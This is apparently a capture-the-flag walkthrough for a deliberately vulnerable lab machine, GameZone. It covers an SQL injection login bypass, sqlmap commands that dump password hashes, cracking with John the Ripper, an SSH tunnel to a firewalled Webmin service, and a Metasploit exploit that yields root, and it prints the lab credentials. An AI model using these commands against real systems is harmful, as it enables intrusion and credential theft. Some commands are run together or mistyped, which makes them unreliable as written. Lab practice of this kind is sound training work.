# **[Task 1] Deploy the vulnerable machine**

**#1** Deploy the machine and access its web server.

![](https://miro.medium.com/max/60/1*spfKfRiwCUlV2SZZDH0PvQ.png?q=20)

![](https://miro.medium.com/max/730/1*spfKfRiwCUlV2SZZDH0PvQ.png)

**#2** What is the name of the large cartoon avatar holding a sniper on the forum?

agent 47

# **[Task 2] Obtain access via SQLi**

**#1** SQL is a standard language for storing, editing and retrieving data in databases.

**#2** Lets use what we’ve learnt above, to manipulate the query and login without any legitimate credentials.

Log in : ' or 1=1 #

![](https://miro.medium.com/max/56/1*N6eGZ1XfeT9XecjeyFXObQ.png?q=20)

![](https://miro.medium.com/max/786/1*N6eGZ1XfeT9XecjeyFXObQ.png)

**#3** GameZone doesn’t have an admin user in the database, however you can still login without knowing any credentials using the inputted password data we used in the previous question.

http://10.10.73.54/portal.php

![](https://miro.medium.com/max/60/1*MwfHmq8JIhC1_d1fuQlc8g.png?q=20)

![](https://miro.medium.com/max/693/1*MwfHmq8JIhC1_d1fuQlc8g.png)

When you’ve logged in, what page do you get redirected to?

portal.php

# **[Task 3] Using SQLMap**

**#1** We’re going to use SQLMap to dump the entire database for GameZone.

sqlmap -u "http://10.10.73.54/portal.php" --data="searchitem=cyberops" --dbs

![](https://miro.medium.com/max/60/1*7sRC6Fp9UC8staxWYn3yfQ.png?q=20)

![](https://miro.medium.com/max/266/1*7sRC6Fp9UC8staxWYn3yfQ.png)

sqlmap -u "[http://10.10.73.54/portal.php](http://10.10.73.54/portal.php)" --data="searchitem=cyberops" -D db --tablessqlmap -u "[http://10.10.73.54/portal.php](http://10.10.73.54/portal.php)" --data="searchitem=cyberops" -D db -T users --culumnssqlmap -u "[http://10.10.73.54/portal.php](http://10.10.73.54/portal.php)" --data="searchitem=cyberops" -D db -T users -C username,pwd --dump

![](https://miro.medium.com/max/60/1*yA4zLrTilxh_uSXR9vloIA.png?q=20)

![](https://miro.medium.com/max/743/1*yA4zLrTilxh_uSXR9vloIA.png)

In the users table, what is the hashed password?

ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

**#2** What was the username associated with the hashed password?

agent47

**#3** What was the other table name?

post

![](https://miro.medium.com/max/60/1*z42M2uMvMElRqb7zM-GdAQ.png?q=20)

![](https://miro.medium.com/max/147/1*z42M2uMvMElRqb7zM-GdAQ.png)

# **[Task 4] Cracking a password with JohnTheRipper**

**#2** What is the de-hashed password?

echo "ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14" > pwdjohn pwd --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt

![](https://miro.medium.com/max/60/1*PK0dhtnO9-2_CbyWKeJA0Q.png?q=20)

![](https://miro.medium.com/max/958/1*PK0dhtnO9-2_CbyWKeJA0Q.png)

videogamer124

**#3** Now you have a password and username. Try SSH’ing onto the machine.

ssh agent47@10.10.73.54

![](https://miro.medium.com/max/60/1*Xe_FTCwnE1RgYTL9xB44Zg.png?q=20)

![](https://miro.medium.com/max/726/1*Xe_FTCwnE1RgYTL9xB44Zg.png)

What is the user flag?

cat /home/agent47/user.txt

# **[Task 5] Exposing services with reverse SSH tunnels**

**#1** How any TCP sockets are running?

ss -tulpn

![](https://miro.medium.com/max/60/1*uly7lNnNTzQDr6rOy1nKKw.png?q=20)

![](https://miro.medium.com/max/889/1*uly7lNnNTzQDr6rOy1nKKw.png)

5

**#2** We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

ssh -L 10000:localhost:10000 agent47@10.10.73.54

![](https://miro.medium.com/max/60/1*mIt1tCnLIrYivsHJO4skAQ.png?q=20)

![](https://miro.medium.com/max/726/1*mIt1tCnLIrYivsHJO4skAQ.png)

http://localhost:10000/

![](https://miro.medium.com/max/60/1*_Vc9W2WuHiR79JQRGgvV4A.png?q=20)

![](https://miro.medium.com/max/799/1*_Vc9W2WuHiR79JQRGgvV4A.png)

User : agent47  
Pass : videogamer124

![](https://miro.medium.com/max/60/1*GgmHS0_Z5cSzo3eW-rrYTw.png?q=20)

![](https://miro.medium.com/max/799/1*GgmHS0_Z5cSzo3eW-rrYTw.png)

What is the name of the exposed CMS?

webmin

**#3** What is the CMS version?

1.580

# **[Task 6] Privilege Escalation with Metasploit**

msfconsole

![](https://miro.medium.com/max/60/1*i9e8QhCgbx1q1BbwTLB_oQ.png?q=20)

![](https://miro.medium.com/max/639/1*i9e8QhCgbx1q1BbwTLB_oQ.png)

use exploit/unix/webapp/webmin_show_cgi_exec  
set RHOSTS localhost  
set USERNAME agent47  
set PASSWORD videogamer124  
set SSL false  
exploit

![](https://miro.medium.com/max/60/1*GE0_nv9tdMPmhxcbfNw9vw.png?q=20)

![](https://miro.medium.com/max/950/1*GE0_nv9tdMPmhxcbfNw9vw.png)

python -c ‘import pty; pty.spawn(“/bin/bash”)’

![](https://miro.medium.com/max/60/1*gbRug2fFnk9w2f7SkKclkA.png?q=20)

![](https://miro.medium.com/max/446/1*gbRug2fFnk9w2f7SkKclkA.png)

**#1** What is the root flag?

cat /root/root.txt

![](https://miro.medium.com/max/60/1*3YiS9MZUVOqMmwS3OMlcnA.png?q=20)

![](https://miro.medium.com/max/824/1*3YiS9MZUVOqMmwS3OMlcnA.png)
